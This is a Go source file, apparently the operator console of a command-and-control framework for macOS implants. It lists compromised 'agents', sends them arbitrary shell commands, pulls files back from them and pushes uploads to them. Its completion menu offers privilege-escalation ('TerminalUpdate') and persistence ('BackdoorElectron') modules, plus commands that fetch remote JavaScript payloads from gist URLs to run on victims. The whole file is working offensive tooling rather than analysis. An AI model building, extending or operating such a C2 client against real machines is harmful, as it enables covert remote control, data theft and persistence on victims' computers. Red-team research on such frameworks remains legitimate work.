package cli

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"github.com/gookit/color"
	"github.com/lithammer/shortuuid"
)

var timeoutSetting = 1
var agent string = "Not Connected"
var c2 string

//Cmd ...
type Cmd struct {
	ID      string
	Command string
	Agent   string
	Status  string
	Cmdid   string
	Output  string
}

//Agent ...
type Agent struct {
	ID      string
	Agent   string
	Working string
	Files   string
	checkIn time.Time
}

//ListAgents ...
func ListAgents(c2 string) {
	getAgents(c2 + "/api/agents/")
}

func getAgents(url string) {

	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		fmt.Println(readErr)
	}

	var results []Agent
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		fmt.Println(jsonErr)
	}

	for _, d := range results {
		fmt.Fprintln(os.Stderr, "Active callback: "+d.Agent)
	}
}

var wd string = ""

//Start ...
func Start(c2 string) {

	red := color.FgRed.Render
	blue := color.FgBlue.Render
	fmt.Println("Connected: " + red(c2))
	ascii := `
		┏━━━┓╋╋╋┏━━━┳━━━┓
		┃┏━┓┃╋╋╋┃┏━┓┃┏━┓┃
		┃┃╋┗╋━━┓┃┃╋┗┻┛┏┛┃
		┃┃┏━┫┏┓┃┃┃╋┏┳━┛┏┛
		┃┗┻━┃┗┛┃┃┗━┛┃┃┗━┓
		┗━━━┻━━┛┗━━━┻━━━┛ by grines`
	print(ascii + "\n")

	for {
		var completer = readline.NewPrefixCompleter(
			readline.PcItem("download",
				readline.PcItemDynamic(listFiles(c2, agent)),
			),
			readline.PcItem("upload"),
			readline.PcItem("osa",
				readline.PcItem("https://gist.githubusercontent.com/grines/d16db7b7a2cd18e6c2ee09b56643d87a/raw/7487b362b022092e826b3b9d11fbb01256733110/prompt.js"),
				readline.PcItem("https://gist.githubusercontent.com/grines/6ffe50be47c6637dc718c03fa2f23a14/raw/7b907cbc61a77355448fd4baa4623051e7ef0cad/test.js"),
			),
			readline.PcItem("agent",
				readline.PcItemDynamic(listAgents(c2)),
			),
			readline.PcItem("cd",
				readline.PcItemDynamic(listFiles(c2, agent)),
			),
			readline.PcItem("cat",
				readline.PcItemDynamic(listFiles(c2, agent)),
			),
			readline.PcItem("mv",
				readline.PcItemDynamic(listFiles(c2, agent)),
			),
			readline.PcItem("cp",
				readline.PcItemDynamic(listFiles(c2, agent)),
			),
			readline.PcItem("privesc",
				readline.PcItem("TerminalUpdate"),
			),
			readline.PcItem("persist",
				readline.PcItem("BackdoorElectron"),
			),
			readline.PcItem("jxa",
				readline.PcItem("https://gist.githubusercontent.com/grines/d16db7b7a2cd18e6c2ee09b56643d87a/raw/7487b362b022092e826b3b9d11fbb01256733110/prompt.js"),
				readline.PcItem("https://gist.githubusercontent.com/grines/6ffe50be47c6637dc718c03fa2f23a14/raw/7b907cbc61a77355448fd4baa4623051e7ef0cad/test.js"),
			),
		)
		l, err := readline.NewEx(&readline.Config{
			Prompt:          "\033[31m»\033[0m ",
			HistoryFile:     "/tmp/readline.tmp",
			AutoComplete:    completer,
			InterruptPrompt: "^C",
			EOFPrompt:       "exit",

			HistorySearchFold:   true,
			FuncFilterInputRune: filterInput,
		})
		if err != nil {
			panic(err)
		}
		defer l.Close()

		log.SetOutput(l.Stderr())
		if agent != "Not Connected" {
			wd, err := getAgentWorking(c2 + "/api/agent/" + agent)
			if err != nil {
				fmt.Println("Agent does not exist.")
				agent = "Not Connected"
				l.SetPrompt(" <" + blue(agent) + "*> ")
			} else {
				l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
			}
			l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
		} else {
			l.SetPrompt(" <" + blue(agent) + "*> ")
		}
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "agent "):
			parts := strings.Split(line, " ")
			if len(parts) == 2 {
				agent = parts[1]
			} else {
				agent = "Not Connected"
			}
		case line == "login":
			pswd, err := l.ReadPassword("please enter your password: ")
			if err != nil {
				break
			}
			println("you enter:", strconv.Quote(string(pswd)))
		case line == "history":
			dat, err := ioutil.ReadFile("/tmp/readline.tmp")
			if err != nil {
				break
			}
			fmt.Print(string(dat))
		case line == "bye":
			goto exit
		case line == "sleep":
			log.Println("sleep 4 second")
			time.Sleep(4 * time.Second)
		case line == "":
		default:
			if agent == "Not Connected" {
				fmt.Println("You are not connected to an agent.")
				break
			}
			cmdString := line
			if cmdString == "exit" {
				os.Exit(1)
			}

			if strings.Contains(cmdString, "upload ") {
				parts := strings.Split(cmdString, " ")
				file := parts[1]
				tempfile := uploadFile(file, c2)
				if tempfile == "NotFound" {
					fmt.Println("File not found")
					break
				}
				cmdString = "upload " + tempfile
				cmdid := sendCommand(cmdString, agent, c2)
				deadline := time.Now().Add(15 * time.Second)
				for {
					id, output := getOutput(c2+"/api/cmd/output/"+agent+"/"+cmdid, c2, cmdid)
					sDec, _ := base64.StdEncoding.DecodeString(output)
					if id == cmdid && output != "" || cmdString == "" {
						fmt.Fprintln(os.Stderr, string(sDec))
						wd, err := getAgentWorking(c2 + "/api/agent/" + agent)
						if err != nil {
							fmt.Println(err)
						}
						l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
						break
					}
					if time.Now().After(deadline) {
						fmt.Fprintln(os.Stderr, "*Timeout*")
						break
					}
				}
				break
			}

			cmdid := sendCommand(cmdString, agent, c2)
			deadline := time.Now().Add(15 * time.Second)
			for {
				id, output := getOutput(c2+"/api/cmd/output/"+agent+"/"+cmdid, c2, cmdid)
				sDec, _ := base64.StdEncoding.DecodeString(output)
				if strings.Contains(output, "Location:") {
					parts := strings.Split(output, " ")
					path := parts[1]
					file := filepath.Base(path)
					downloadFile("/tmp/"+file, c2+"/files/"+file)
					//fmt.Println("Process Download" + file)
				}
				if id == cmdid && output != "" || cmdString == "" {
					fmt.Fprintln(os.Stderr, string(sDec))
					wd, err := getAgentWorking(c2 + "/api/agent/" + agent)
					if err != nil {
						fmt.Println(err)
					}
					l.SetPrompt(red(wd) + " <" + blue(agent) + "*> ")
					break
				}
				if time.Now().After(deadline) {
					fmt.Fprintln(os.Stderr, "*Timeout*")
					break
				}
			}
		}
	}
exit:
}

func listFiles(c2 string, agent string) func(string) []string {
	return func(line string) []string {
		resp, err := http.Get(c2 + "/api/agent/" + agent)
		if resp.Status == "200 OK" {

			if err != nil {
				log.Println(err)
			}
			if resp.Body != nil {
				defer resp.Body.Close()
			}

			body, readErr := ioutil.ReadAll(resp.Body)
			if readErr != nil {
				fmt.Println(readErr)
			}

			var results Agent
			jsonErr := json.Unmarshal(body, &results)
			if jsonErr != nil {
				fmt.Println(jsonErr)
			}

			names := strings.Split(results.Files, ",")
			return names
		}
		return nil
	}
}

// Function constructor - constructs new function for listing given directory
func listAgents(c2 string) func(string) []string {
	return func(line string) []string {
		resp, err := http.Get(c2 + "/api/agents")
		if resp.Status == "200 OK" {
			if err != nil {
				fmt.Println(err)
			}
			if resp.Body != nil {
				defer resp.Body.Close()
			}

			body, readErr := ioutil.ReadAll(resp.Body)
			if readErr != nil {
				fmt.Println(readErr)
			}

			var results []Agent
			jsonErr := json.Unmarshal(body, &results)
			if jsonErr != nil {
				fmt.Println(jsonErr)
			}

			names := make([]string, 0)
			for _, d := range results {
				names = append(names, d.Agent)
			}
			return names
		}
		var a = []string{""}
		return a

	}
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

func sendCommand(cmd string, agent string, c2 string) string {
	randid := shortuuid.New()
	resp, err := http.PostForm(c2+"/api/cmd/new",
		url.Values{"cmdid": {randid}, "cmd": {cmd}, "agent": {agent}})

	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
	return randid
}

func getOutput(url string, c2 string, cmd string) (string, string) {

	resp, err := http.Get(url)
	if resp.Status == "200 OK" {
		if err != nil {
			panic(err)
		}
		if resp.Body != nil {
			defer resp.Body.Close()
		}

		body, readErr := ioutil.ReadAll(resp.Body)
		if readErr != nil {
			fmt.Println(readErr)
		}

		var results []Cmd
		jsonErr := json.Unmarshal(body, &results)
		if jsonErr != nil {
			fmt.Println(jsonErr)
		}

		for _, d := range results {
			return d.Cmdid, d.Output
		}
	}
	return "False", "False"

}

func getAgentWorking(url string) (string, error) {

	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	if resp.Status == "200 OK" {

		if err != nil {
			fmt.Println(err)
		}
		if resp.Body != nil {
			defer resp.Body.Close()
		}

		body, readErr := ioutil.ReadAll(resp.Body)
		if readErr != nil {
			fmt.Println(readErr)
		}

		var results Agent
		jsonErr := json.Unmarshal(body, &results)
		if jsonErr != nil {
			fmt.Println(jsonErr)
		}

		return results.Working, err
	}
	return "", err

}

func updateCmdStatus(cmdid string, c2 string) {
	resp, err := http.PostForm(c2+"/api/cmd/update/output",
		url.Values{"id": {cmdid}, "client_status": {"1"}})

	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}

func copy(src, dst string) (int64, error) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err
}

func downloadFile(filepath string, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("err:", err)
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

func uploadFile(path string, c2 string) string {
	if _, err := os.Stat(path); err == nil {
		extraParams := map[string]string{
			"operator": "none",
		}
		request, err := newfileUploadRequest(c2+"/api/cmd/files", extraParams, "myFile", path)
		if err != nil {
			fmt.Println(err)
		}
		client := &http.Client{}
		resp, err := client.Do(request)
		if err != nil {
			fmt.Println(err)
		} else {
			body := &bytes.Buffer{}
			_, err := body.ReadFrom(resp.Body)
			if err != nil {
				fmt.Println(err)
			}
			resp.Body.Close()
			return body.String()
		}
		return "Found"
	}
	return "NotFound"
}

// Creates a new file upload http request with optional extra params
func newfileUploadRequest(uri string, params map[string]string, paramName, path string) (*http.Request, error) {
	if _, err := os.Stat(path); err == nil {
		file, err := os.Open(path)
		if err != nil {
			return nil, err
		}
		defer file.Close()

		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)
		part, err := writer.CreateFormFile(paramName, filepath.Base(path))
		if err != nil {
			return nil, err
		}
		_, err = io.Copy(part, file)

		for key, val := range params {
			_ = writer.WriteField(key, val)
		}
		err = writer.Close()
		if err != nil {
			return nil, err
		}

		req, err := http.NewRequest("POST", uri, body)
		req.Header.Set("Content-Type", writer.FormDataContentType())
		return req, err
	}
	return nil, nil
}
